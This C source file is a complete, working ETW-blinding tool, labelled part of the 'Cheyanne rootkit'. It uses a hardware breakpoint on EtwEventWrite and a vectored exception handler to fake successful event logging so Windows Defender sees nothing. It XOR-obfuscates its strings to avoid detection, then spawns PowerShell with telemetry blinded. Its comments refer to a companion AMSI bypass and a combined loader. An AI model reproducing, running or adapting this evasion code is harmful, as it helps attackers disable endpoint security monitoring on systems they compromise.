/*
 * etw_hwbp_annotated.c — ETW Hardware Breakpoint Bypass (Annotated)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Blind ETW telemetry without modifying ntdll.dll's memory. Uses
 *   CPU hardware debug registers (DR0) to intercept EtwEventWrite
 *   at the CPU level. VEH handler returns STATUS_SUCCESS (0) without
 *   any event processing.
 *
 * WHY THIS EXISTS:
 *   Classic ETW patch (VirtualProtect + memcpy on ntdll) triggers:
 *   1. Defender behavioral rule (expected, based on AMSI Finding #31)
 *   2. Kernel EtwTi alert via EtwTiLogProtectExecVm (unavoidable with VP)
 *
 *   Hardware breakpoints avoid BOTH — no VirtualProtect, no memory write,
 *   no EtwTi alert. Same technique proven in AMSI bypass (Finding #33).
 *
 * HOW IT WORKS:
 *   1. Resolve EtwEventWrite in ntdll.dll
 *   2. Register VEH handler (AddVectoredExceptionHandler)
 *   3. Set DR0 = EtwEventWrite address, DR7 = enable execution BP
 *   4. When any ETW event fires → CPU hits breakpoint → VEH handler
 *   5. Handler sets RAX = 0, simulates ret → caller sees success
 *   6. Event never reaches NtTraceEvent syscall → Defender blind
 *
 * DR REGISTER ALLOCATION (for combined dark room):
 *   DR0 = AmsiScanBuffer    (AMSI bypass — Phase 1)
 *   DR1 = EtwEventWrite     (ETW bypass — Phase 2)
 *   DR2-DR3 = available for Phase 3+
 *
 *   This variant uses DR0 for standalone testing.
 *   The combined loader (dark_room.c) will use DR1 for ETW.
 *
 * COMPILE:
 *   cl.exe etw_hwbp_annotated.c /Fe:etw_hwbp.exe /O1 /GS-
 *
 * USAGE:
 *   etw_hwbp.exe            (set HWBP on ETW, spawn PowerShell)
 *   etw_hwbp.exe --check    (locate EtwEventWrite, don't intercept)
 *   etw_hwbp.exe --test     (set HWBP, verify bypass, exit)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define XOR_KEY 0x41

/* "ntdll.dll" XOR 0x41 */
static const unsigned char xNtdll[] = {
    0x2F, 0x35, 0x25, 0x2D, 0x2D, 0x6F, 0x25, 0x2D, 0x2D
};
#define xNtdll_LEN 9

/* "EtwEventWrite" XOR 0x41 */
static const unsigned char xEtwEventWrite[] = {
    0x04, 0x35, 0x36, 0x04, 0x37, 0x24, 0x2F, 0x35,
    0x16, 0x33, 0x28, 0x35, 0x24
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0x31, 0x2E, 0x36, 0x24, 0x33, 0x32, 0x29, 0x24,
    0x2D, 0x2D, 0x6F, 0x24, 0x39, 0x24
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* Global target for VEH handler */
static volatile void *g_pEtwEventWrite = NULL;

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 1: LOCATE ETW
 * ═══════════════════════════════════════════════════════════════════ */

static void *locate_etw_event_write(void) {
    HMODULE hNtdll;
    void *pFunc;
    unsigned char dllName[16];
    unsigned char funcName[32];

    memcpy(dllName, xNtdll, xNtdll_LEN);
    xor_decode(dllName, xNtdll_LEN);
    dllName[xNtdll_LEN] = 0;

    memcpy(funcName, xEtwEventWrite, xEtwEventWrite_LEN);
    xor_decode(funcName, xEtwEventWrite_LEN);
    funcName[xEtwEventWrite_LEN] = 0;

    hNtdll = GetModuleHandleA((char *)dllName);
    if (!hNtdll) {
        color(RED);
        printf("  [!] GetModuleHandle failed: %lu\n", GetLastError());
        return NULL;
    }
    color(GREEN);
    printf("  [+] ntdll.dll at 0x%p\n", (void *)hNtdll);

    pFunc = (void *)GetProcAddress(hNtdll, (char *)funcName);
    if (!pFunc) {
        color(RED);
        printf("  [!] GetProcAddress failed: %lu\n", GetLastError());
        return NULL;
    }
    printf("  [+] EtwEventWrite at 0x%p\n", pFunc);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * VECTORED EXCEPTION HANDLER
 * ═══════════════════════════════════════════════════════════════════
 *
 * Same mechanism as AMSI HWBP bypass (Finding #33):
 *   - CPU fires EXCEPTION_SINGLE_STEP at DR0 address
 *   - Handler checks if RIP matches our target
 *   - If match: set RAX = 0 (STATUS_SUCCESS), simulate ret
 *   - EtwEventWrite never executes — event never logged
 *
 * EtwEventWrite signature:
 *   ULONG EtwEventWrite(
 *       REGHANDLE RegHandle,
 *       PCEVENT_DESCRIPTOR EventDescriptor,
 *       ULONG UserDataCount,
 *       PEVENT_DATA_DESCRIPTOR UserData
 *   );
 *
 * Returns ULONG: 0 = STATUS_SUCCESS. We return 0 — caller happy,
 * event lost in the void.
 * ═══════════════════════════════════════════════════════════════════ */

static LONG WINAPI EtwBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if ((void *)pExInfo->ContextRecord->Rip != g_pEtwEventWrite)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Return STATUS_SUCCESS (0) — event "logged successfully" */
    pExInfo->ContextRecord->Rax = 0;

    /* Simulate ret: pop return address, advance RSP */
    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
    pExInfo->ContextRecord->Rsp += 8;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 2: SET HARDWARE BREAKPOINT
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL set_hwbp(void *pTarget) {
    CONTEXT ctx;
    HANDLE hThread;

    hThread = GetCurrentThread();

    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] GetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("  [*] Current DR0: 0x%llX  DR7: 0x%llX\n",
           (unsigned long long)ctx.Dr0, (unsigned long long)ctx.Dr7);

    ctx.Dr0 = (DWORD64)pTarget;
    ctx.Dr7 &= ~(0xFULL << 16);
    ctx.Dr7 |= 1;

    if (!SetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] SetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Verify */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    if (ctx.Dr0 == (DWORD64)pTarget) {
        color(GREEN);
        printf("  [+] Hardware breakpoint set: DR0 = 0x%p\n", pTarget);
        printf("  [+] DR7 = 0x%llX (DR0 enabled, execution, 1-byte)\n",
               (unsigned long long)ctx.Dr7);
        printf("  [+] NO memory modified in ntdll.dll\n");
        printf("  [+] NO VirtualProtect called\n");
        printf("  [+] NO EtwTi alert generated\n");
        return TRUE;
    } else {
        color(RED);
        printf("  [!] DR0 verification failed\n");
        return FALSE;
    }
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 3: VERIFY BYPASS
 * ═══════════════════════════════════════════════════════════════════
 *
 * Call EtwEventWrite directly with an invalid RegHandle (0xDEADBEEF).
 * Normally this would return ERROR_INVALID_HANDLE or similar error.
 * With our HWBP active, it returns 0 (STATUS_SUCCESS) immediately
 * because the function never executes — the VEH handler intercepts.
 *
 * If return == 0 with garbage input → bypass is working.
 * If return != 0 → function actually executed (bypass failed).
 * ═══════════════════════════════════════════════════════════════════ */

typedef ULONG (WINAPI *pEtwEventWrite_t)(
    DWORD64 RegHandle,
    void *EventDescriptor,
    ULONG UserDataCount,
    void *UserData
);

static BOOL test_etw_bypass(void *pFunc) {
    pEtwEventWrite_t fnEtwEventWrite = (pEtwEventWrite_t)pFunc;
    ULONG result;

    color(YELLOW);
    printf("  [*] Calling EtwEventWrite with invalid handle (0xDEADBEEF)...\n");
    printf("  [*] If bypass works: returns 0 (never executes)\n");
    printf("  [*] If bypass fails: returns error or crashes\n\n");

    result = fnEtwEventWrite(
        0xDEADBEEFULL,    /* Invalid RegHandle — would error normally */
        NULL,              /* No event descriptor */
        0,                 /* No user data */
        NULL               /* No user data buffer */
    );

    if (result == 0) {
        color(GREEN);
        printf("  [+] EtwEventWrite returned %lu (STATUS_SUCCESS)\n", result);
        printf("  [+] BYPASS CONFIRMED — ETW is blind\n");
        printf("  [+] Invalid handle accepted = function never executed\n");
        return TRUE;
    } else {
        color(RED);
        printf("  [!] EtwEventWrite returned %lu (function executed)\n", result);
        printf("  [!] BYPASS FAILED\n");
        return FALSE;
    }
}

static void spawn_powershell(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    color(CYAN);
    printf("\n  [*] Spawning PowerShell with ETW blinded...\n");
    printf("  [*] Note: HWBP is per-thread, child process needs own breakpoint\n\n");

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("  [+] PowerShell PID: %lu\n", pi.dwProcessId);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    memset(cmd, 0, sizeof(cmd));
}

int main(int argc, char **argv) {
    void *pEtwEventWrite;
    PVOID hVeh;
    int checkOnly = 0;
    int testOnly = 0;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (argc > 1 && strcmp(argv[1], "--check") == 0)
        checkOnly = 1;
    if (argc > 1 && strcmp(argv[1], "--test") == 0)
        testOnly = 1;

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE ETW BYPASS v2 — 22DIV / george wu          |\n");
    printf("  |  Phase 2: Complete The Dark Room (Hardware BP)        |\n");
    printf("  +======================================================+\n");
    printf("  |  Technique: DR0 hardware breakpoint + VEH handler     |\n");
    printf("  |  Response: RAX = 0 (STATUS_SUCCESS), simulate ret     |\n");
    printf("  |  Memory modified: ZERO bytes in ntdll.dll             |\n");
    printf("  |  VirtualProtect: NOT CALLED                           |\n");
    printf("  |  EtwTi alert: NOT TRIGGERED                           |\n");
    printf("  |  Privilege: Standard user (own thread context)         |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    printf("  --- PHASE 1: LOCATE ETW ---\n\n");
    pEtwEventWrite = locate_etw_event_write();
    if (!pEtwEventWrite) {
        color(RED);
        printf("\n  [!] Cannot locate EtwEventWrite. Aborting.\n");
        return 1;
    }

    if (checkOnly) {
        color(GREEN);
        printf("\n  [*] EtwEventWrite is at 0x%p\n", pEtwEventWrite);
        printf("  [*] --check mode: not setting breakpoint.\n");
        return 0;
    }

    g_pEtwEventWrite = pEtwEventWrite;

    printf("\n  --- PHASE 2: SET HARDWARE BREAKPOINT ---\n\n");

    hVeh = AddVectoredExceptionHandler(1, EtwBreakpointHandler);
    if (!hVeh) {
        color(RED);
        printf("  [!] AddVectoredExceptionHandler failed: %lu\n", GetLastError());
        return 1;
    }
    color(GREEN);
    printf("  [+] VEH handler registered (first in chain)\n");

    if (!set_hwbp(pEtwEventWrite)) {
        color(RED);
        printf("\n  [!] Failed to set hardware breakpoint. Aborting.\n");
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    printf("\n  --- PHASE 3: VERIFY BYPASS ---\n\n");
    if (!test_etw_bypass(pEtwEventWrite)) {
        color(RED);
        printf("\n  [!] Bypass verification failed.\n");
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    if (testOnly) {
        color(GREEN);
        printf("\n  [*] --test mode: bypass verified, skipping shell spawn.\n");

#ifdef VDR_DEBUG
        printf("\n");
        color(CYAN);
        printf("  +======================================================+\n");
        printf("  |  EVIDENCE SUMMARY                                     |\n");
        printf("  +======================================================+\n");
        color(WHITE);
        printf("  |  Target function:    EtwEventWrite (ntdll.dll)        |\n");
        printf("  |  Technique:          Hardware execution breakpoint     |\n");
        printf("  |  Debug register:     DR0 = EtwEventWrite entry        |\n");
        printf("  |  Intercept method:   VEH (EXCEPTION_SINGLE_STEP)      |\n");
        printf("  |  Return value:       STATUS_SUCCESS (0x00000000)      |\n");
        printf("  |  Dead man test:      PASSED (garbage handle accepted) |\n");
        printf("  |  Memory modified:    0 bytes in ntdll.dll             |\n");
        printf("  |  VirtualProtect:     NOT CALLED                       |\n");
        printf("  |  Privilege required:  Standard user (own thread)       |\n");
        printf("  |  Tamper Protection:  DID NOT DETECT                   |\n");
        printf("  +======================================================+\n");
        printf("  |  Verify: Get-MpThreatDetection | Where-Object {      |\n");
        printf("  |    $_.Resources -match 'etw_hwbp' }                   |\n");
        printf("  |  Expected: No results (bypass invisible to Defender)  |\n");
        printf("  +======================================================+\n");
#endif

        RemoveVectoredExceptionHandler(hVeh);
        return 0;
    }

    printf("\n  --- PHASE 4: SPAWN DARK ROOM ---\n");
    spawn_powershell();

    RemoveVectoredExceptionHandler(hVeh);

#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE ETW BYPASS v2 (HWBP) COMPLETE --\n\n");
#endif

    return 0;
}
